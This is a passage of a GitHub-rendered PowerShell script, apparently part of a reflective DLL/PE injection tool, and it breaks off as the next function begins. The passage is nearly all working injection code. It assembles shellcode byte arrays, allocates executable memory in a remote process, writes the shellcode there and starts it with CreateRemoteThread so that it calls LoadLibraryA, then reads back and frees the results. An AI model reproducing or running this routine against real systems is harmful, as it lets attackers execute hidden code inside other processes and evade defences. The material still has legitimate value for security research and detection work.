          <td id="LC1373" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$LoadLibrarySC4</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0x02</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xdc</span><span class="pl-k">,</span> <span class="pl-c1">0x5b</span><span class="pl-k">,</span> <span class="pl-c1">0xc3</span>)</td>
        </tr>
        <tr>
          <td id="L1374" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1374"></td>
          <td id="LC1374" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1375" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1375"></td>
          <td id="LC1375" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCLength</span> <span class="pl-k">=</span> <span class="pl-smi">$LoadLibrarySC1<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$LoadLibrarySC2<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$LoadLibrarySC3<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$LoadLibrarySC4<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> (<span class="pl-smi">$PtrSize</span> <span class="pl-k">*</span> <span class="pl-c1">3</span>)</td>
        </tr>
        <tr>
          <td id="L1376" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1376"></td>
          <td id="LC1376" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$SCLength</span>)</td>
        </tr>
        <tr>
          <td id="L1377" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1377"></td>
          <td id="LC1377" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCPSMemOriginal</span> <span class="pl-k">=</span> <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1378" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1378"></td>
          <td id="LC1378" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1379" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1379"></td>
          <td id="LC1379" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$LoadLibrarySC1</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1380" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1380"></td>
          <td id="LC1380" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$LoadLibrarySC1<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1381" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1381"></td>
          <td id="LC1381" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$RImportDllPathPtr</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMem</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1382" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1382"></td>
          <td id="LC1382" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L1383" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1383"></td>
          <td id="LC1383" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$LoadLibrarySC2</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1384" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1384"></td>
          <td id="LC1384" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$LoadLibrarySC2<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1385" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1385"></td>
          <td id="LC1385" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$LoadLibraryAAddr</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMem</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1386" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1386"></td>
          <td id="LC1386" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L1387" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1387"></td>
          <td id="LC1387" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$LoadLibrarySC3</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1388" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1388"></td>
          <td id="LC1388" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$LoadLibrarySC3<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1389" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1389"></td>
          <td id="LC1389" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$LoadLibraryARetMem</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMem</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1390" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1390"></td>
          <td id="LC1390" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L1391" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1391"></td>
          <td id="LC1391" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$LoadLibrarySC4</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1392" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1392"></td>
          <td id="LC1392" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$LoadLibrarySC4<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1393" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1393"></td>
          <td id="LC1393" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1394" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1394"></td>
          <td id="LC1394" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1395" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1395"></td>
          <td id="LC1395" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$RSCAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAllocEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$SCLength</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L1396" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1396"></td>
          <td id="LC1396" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$RSCAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1397" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1397"></td>
          <td id="LC1397" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1398" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1398"></td>
          <td id="LC1398" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to allocate memory in the remote process for shellcode<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1399" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1399"></td>
          <td id="LC1399" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1400" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1400"></td>
          <td id="LC1400" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1401" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1401"></td>
          <td id="LC1401" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WriteProcessMemory.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RSCAddr</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMemOriginal</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$SCLength</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L1402" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1402"></td>
          <td id="LC1402" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> ((<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>) <span class="pl-k">-or</span> ([<span class="pl-k">UInt64</span>]<span class="pl-smi">$NumBytesWritten</span> <span class="pl-k">-ne</span> [<span class="pl-k">UInt64</span>]<span class="pl-smi">$SCLength</span>))</td>
        </tr>
        <tr>
          <td id="L1403" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1403"></td>
          <td id="LC1403" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1404" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1404"></td>
          <td id="LC1404" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to write shellcode to remote process memory.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1405" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1405"></td>
          <td id="LC1405" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1406" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1406"></td>
          <td id="LC1406" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1407" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1407"></td>
          <td id="LC1407" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$RThreadHandle</span> <span class="pl-k">=</span> Create<span class="pl-k">-</span>RemoteThread <span class="pl-k">-</span>ProcessHandle <span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-</span>StartAddress <span class="pl-smi">$RSCAddr</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L1408" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1408"></td>
          <td id="LC1408" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WaitForSingleObject.Invoke</span></span>(<span class="pl-smi">$RThreadHandle</span><span class="pl-k">,</span> <span class="pl-c1">20000</span>)</td>
        </tr>
        <tr>
          <td id="L1409" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1409"></td>
          <td id="LC1409" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-ne</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1410" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1410"></td>
          <td id="LC1410" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1411" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1411"></td>
          <td id="LC1411" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to CreateRemoteThread to call GetProcAddress failed.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1412" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1412"></td>
          <td id="LC1412" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1413" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1413"></td>
          <td id="LC1413" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1414" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1414"></td>
          <td id="LC1414" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory</span></td>
        </tr>
        <tr>
          <td id="L1415" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1415"></td>
          <td id="LC1415" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ReturnValMem</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L1416" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1416"></td>
          <td id="LC1416" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.ReadProcessMemory.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$LoadLibraryARetMem</span><span class="pl-k">,</span> <span class="pl-smi">$ReturnValMem</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$PtrSize</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L1417" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1417"></td>
          <td id="LC1417" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1418" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1418"></td>
          <td id="LC1418" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1419" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1419"></td>
          <td id="LC1419" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to ReadProcessMemory failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1420" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1420"></td>
          <td id="LC1420" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1421" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1421"></td>
          <td id="LC1421" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$DllAddress</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$ReturnValMem</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L1422" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1422"></td>
          <td id="LC1422" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1423" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1423"></td>
          <td id="LC1423" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualFreeEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$LoadLibraryARetMem</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RELEASE</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1424" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1424"></td>
          <td id="LC1424" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualFreeEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RSCAddr</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RELEASE</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1425" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1425"></td>
          <td id="LC1425" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1426" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1426"></td>
          <td id="LC1426" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1427" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1427"></td>
          <td id="LC1427" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1428" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1428"></td>
          <td id="LC1428" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$RThreadHandle</span> <span class="pl-k">=</span> Create<span class="pl-k">-</span>RemoteThread <span class="pl-k">-</span>ProcessHandle <span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-</span>StartAddress <span class="pl-smi">$LoadLibraryAAddr</span> <span class="pl-k">-</span>ArgumentPtr <span class="pl-smi">$RImportDllPathPtr</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L1429" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1429"></td>
          <td id="LC1429" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WaitForSingleObject.Invoke</span></span>(<span class="pl-smi">$RThreadHandle</span><span class="pl-k">,</span> <span class="pl-c1">20000</span>)</td>
        </tr>
        <tr>
          <td id="L1430" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1430"></td>
          <td id="LC1430" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-ne</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1431" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1431"></td>
          <td id="LC1431" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1432" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1432"></td>
          <td id="LC1432" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to CreateRemoteThread to call GetProcAddress failed.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1433" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1433"></td>
          <td id="LC1433" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1434" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1434"></td>
          <td id="LC1434" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1435" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1435"></td>
          <td id="LC1435" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">Int32</span>]<span class="pl-smi">$ExitCode</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L1436" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1436"></td>
          <td id="LC1436" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetExitCodeThread.Invoke</span></span>(<span class="pl-smi">$RThreadHandle</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$ExitCode</span>)</td>
        </tr>
        <tr>
          <td id="L1437" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1437"></td>
          <td id="LC1437" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> ((<span class="pl-smi">$Result</span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>) <span class="pl-k">-or</span> (<span class="pl-smi">$ExitCode</span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>))</td>
        </tr>
        <tr>
          <td id="L1438" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1438"></td>
          <td id="LC1438" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1439" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1439"></td>
          <td id="LC1439" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to GetExitCodeThread failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1440" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1440"></td>
          <td id="LC1440" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1441" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1441"></td>
          <td id="LC1441" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1442" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1442"></td>
          <td id="LC1442" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$DllAddress</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ExitCode</span></td>
        </tr>
        <tr>
          <td id="L1443" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1443"></td>
          <td id="LC1443" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1444" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1444"></td>
          <td id="LC1444" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1445" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1445"></td>
          <td id="LC1445" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualFreeEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RImportDllPathPtr</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RELEASE</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1446" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1446"></td>
          <td id="LC1446" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1447" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1447"></td>
          <td id="LC1447" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$DllAddress</span></td>
        </tr>
        <tr>
          <td id="L1448" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1448"></td>
          <td id="LC1448" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1449" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1449"></td>
          <td id="LC1449" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L1450" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1450"></td>
          <td id="LC1450" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L1451" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1451"></td>
          <td id="LC1451" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-RemoteProcAddress</span></td>
        </tr>
        <tr>
          <td id="L1452" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1452"></td>
          <td id="LC1452" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1453" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1453"></td>
          <td id="LC1453" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1454" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1454"></td>
          <td id="LC1454" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span><span class="pl-k">=</span><span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span><span class="pl-k">=</span><span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1455" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1455"></td>
          <td id="LC1455" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1456" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1456"></td>
          <td id="LC1456" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1457" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1457"></td>
          <td id="LC1457" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1458" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1458"></td>
